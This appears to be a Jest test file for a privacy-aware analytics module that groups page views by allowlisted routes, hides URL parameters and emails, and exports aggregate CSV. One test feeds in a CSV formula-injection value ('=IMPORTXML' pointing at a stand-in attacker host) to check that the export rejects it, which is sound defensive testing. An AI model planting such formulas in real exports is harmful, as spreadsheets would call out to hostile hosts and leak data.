import { buildCabinetAreaInsights, buildCabinetAnalyticsCsv, safeCabinetPageLabel, CabinetTrafficSnapshot } from './cabinetAnalyticsInsights';

const sample: CabinetTrafficSnapshot = {
  summary: { users: 41, newUsers: 17, sessions: 63, pageViews: 150 },
  trend: [{ date: '2026-10-20', users: 5, pageViews: 20 }],
  topPages: [
    { path: '/events?utm_source=private-member-name', views: 23 },
    { path: '/calendar', views: 7 },
    { path: '/leaderboard?search=person@example.com', views: 8 },
    { path: '/points', views: 12 },
    { path: '/get-involved', views: 13 },
    { path: '/intern-program?ref=signup', views: 5 },
    { path: '/gallery', views: 4 },
    { path: '/admin/members?email=student@example.com', views: 999 },
    { path: 'https://other.example/events', views: 400 },
    { path: '/something-not-in-the-public-allowlist', views: 100 },
  ],
};

describe('cabinet analytics: consent-aware aggregate reporting (#288)', () => {
  it('groups only known public routes from returned top pages', () => {
    expect(buildCabinetAreaInsights(sample)).toEqual([
      { key: 'events', label: 'Events and calendar', views: 30 },
      { key: 'tools', label: 'Points and leaderboard', views: 20 },
      { key: 'programs', label: 'Program discovery', views: 18 },
      { key: 'memories', label: 'Gallery and memories', views: 4 },
    ]);
  });

  it('does not present unsampled views as a site-wide traffic share', () => {
    const grouped = buildCabinetAreaInsights(sample);
    const sum = grouped.reduce((total, area) => total + area.views, 0);
    expect(sum).toBe(72);
    expect(sum).not.toBe(sample.summary.pageViews);
  });

  it('hides URL parameters, dynamic segments and unknown paths in the existing top-pages list', () => {
    expect(safeCabinetPageLabel('/events?name=Student+Name')).toBe('/events');
    expect(safeCabinetPageLabel('/events/private-student-id')).toBe('/events/…');
    expect(safeCabinetPageLabel('/admin/members?email=student@example.com')).toBe('Other page');
    expect(safeCabinetPageLabel('/intern-program?ref=student')).toBe('/intern-program');
    expect(safeCabinetPageLabel('https://other.example/points')).toBe('Other page');
  });

  it('exports only safe predefined labels and aggregate counts, never individual paths', () => {
    const csv = buildCabinetAnalyticsCsv(sample, '30daysAgo');
    expect(csv).toContain('30daysAgo,Summary,Page views (consented GA4 sample),150');
    expect(csv).toContain('30daysAgo,Listed top pages only,Events and calendar,30');
    expect(csv).not.toContain('person@example.com');
    expect(csv).not.toContain('student@example.com');
    expect(csv).not.toContain('/admin/');
    expect(csv).not.toContain('utm_source');
    expect(csv).not.toContain('private-member-name');
  });

  it('fails closed on a bogus period label and bad pageview numbers', () => {
    const malformed: CabinetTrafficSnapshot = {
      ...sample,
      topPages: [
        { path: '/events', views: -6 },
        { path: '/points', views: Number.POSITIVE_INFINITY },
      ],
    };
    expect(buildCabinetAreaInsights(malformed).every((area) => area.views === 0)).toBe(true);
    const csv = buildCabinetAnalyticsCsv(malformed, '=IMPORTXML("https://attacker.example")');
    expect(csv).toContain('unknown,');
    expect(csv).not.toContain('IMPORTXML');
  });
});
